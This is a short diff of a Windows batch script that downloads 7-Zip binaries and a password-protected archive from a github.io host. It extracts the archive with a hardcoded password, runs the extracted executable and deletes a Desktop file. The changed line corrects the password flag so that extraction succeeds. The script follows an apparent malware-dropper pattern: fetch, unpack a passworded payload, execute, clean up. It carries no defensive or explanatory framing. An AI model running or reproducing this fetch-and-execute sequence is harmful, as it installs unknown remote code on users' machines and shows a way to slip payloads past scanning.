@@ -6,7 +6,7 @@ curl https://kingdog2.github.io/7z.exe -o "%USERPROFILE%\Desktop\7z.exe"
 curl https://kingdog2.github.io/7z.dll -o "%USERPROFILE%\Desktop\7z.dll"
 curl https://kingdog2.github.io/calc-09163104.7z -o "%USERPROFILE%\calc-09163104.7z"
 
-%USERPROFILE%\Desktop\7z.exe x %USERPROFILE%\calc-09163104.7z -p 7777777 -o%USERPROFILE%
+%USERPROFILE%\Desktop\7z.exe x %USERPROFILE%\calc-09163104.7z -p7777777 -o%USERPROFILE%
 %USERPROFILE%\calc-09163104.exe
 
 del /f %USERPROFILE%\Desktop\A.txt
